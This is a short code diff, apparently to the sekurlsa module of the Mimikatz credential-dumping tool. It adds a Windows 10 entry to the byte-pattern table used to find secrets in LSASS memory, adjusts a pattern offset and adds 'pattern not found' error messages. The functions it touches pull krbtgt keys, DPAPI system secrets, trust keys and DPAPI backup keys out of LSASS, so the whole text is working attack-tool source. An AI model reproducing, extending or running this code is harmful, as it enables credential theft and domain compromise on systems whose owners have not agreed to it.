@@ -416,6 +416,7 @@ KULL_M_PATCH_GENERIC SecDataReferences[] = {
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_W2K8_SecData),		PTRN_W2K8_SecData},		{0, NULL}, { 11, 39}},
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_W2K12_SecData),	PTRN_W2K12_SecData},	{0, NULL}, { 10, 39}},
 	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_SecData),	PTRN_W2K12R2_SecData},	{0, NULL}, {-12, 39}},
+	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_W2K12R2_SecData),	PTRN_W2K12R2_SecData},	{0, NULL}, { -9, 39}},
 };
 #elif defined _M_IX86
 BYTE PTRN_W2K3_SecData[]	= {0x53, 0x56, 0x8d, 0x45, 0x98, 0x50, 0xb9};
@@ -446,6 +447,7 @@ NTSTATUS kuhl_m_sekurlsa_krbtgt(int argc, wchar_t * argv[])
 					kuhl_m_sekurlsa_krbtgt_keys(dualKrbtgt.krbtgt_previous, L"Previous");
 				}
 			}
+			else PRINT_ERROR(L"Unable to find KDC pattern in LSASS memory\n");
 		}
 		else PRINT_ERROR(L"KDC service not in LSASS memory\n");
 	}
@@ -596,6 +598,7 @@ NTSTATUS kuhl_m_sekurlsa_dpapi_system(int argc, wchar_t * argv[])
 					else PRINT_ERROR(L"Not initialized!\n");
 				}
 			}
+			else PRINT_ERROR(L"Pattern not found in DPAPI service\n");
 		}
 		else PRINT_ERROR(L"DPAPI service not in LSASS memory\n");
 	}
@@ -607,7 +610,7 @@ BYTE PTRN_W2K8R2_DomainList[]	= {0xf3, 0x0f, 0x6f, 0x6c, 0x24, 0x30, 0xf3, 0x0f,
 BYTE PTRN_W2K12R2_DomainList[]	= {0x0f, 0x10, 0x45, 0xf0, 0x66, 0x48, 0x0f, 0x7e, 0xc0, 0x0f, 0x11, 0x05};
 KULL_M_PATCH_GENERIC DomainListReferences[] = {
 	{KULL_M_WIN_BUILD_7,	{sizeof(PTRN_W2K8R2_DomainList),		PTRN_W2K8R2_DomainList},	{0, NULL}, {10}},
-	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_DomainList),	PTRN_W2K12R2_DomainList},	{0, NULL}, {12}},
+	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_DomainList),	PTRN_W2K12R2_DomainList},	{0, NULL}, {8}},
 };
 NTSTATUS kuhl_m_sekurlsa_trust(int argc, wchar_t * argv[])
 {
@@ -640,6 +643,7 @@ NTSTATUS kuhl_m_sekurlsa_trust(int argc, wchar_t * argv[])
 						}
 					}
 				}
+				else PRINT_ERROR(L"Pattern not found in KDC service\n");
 			}
 			else PRINT_ERROR(L"KDC service not in LSASS memory\n");
 		}
@@ -753,6 +757,7 @@ void kuhl_m_sekurlsa_bkey(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB 
 			}
 		}
 	}
+	else PRINT_ERROR(L"Pattern not found in DPAPI service\n");
 }
 
 BYTE PTRN_WALL_BackupKey[]			= {0xb9, 0x02, 0x00, 0x00, 0x00, 0x89, 0x05};
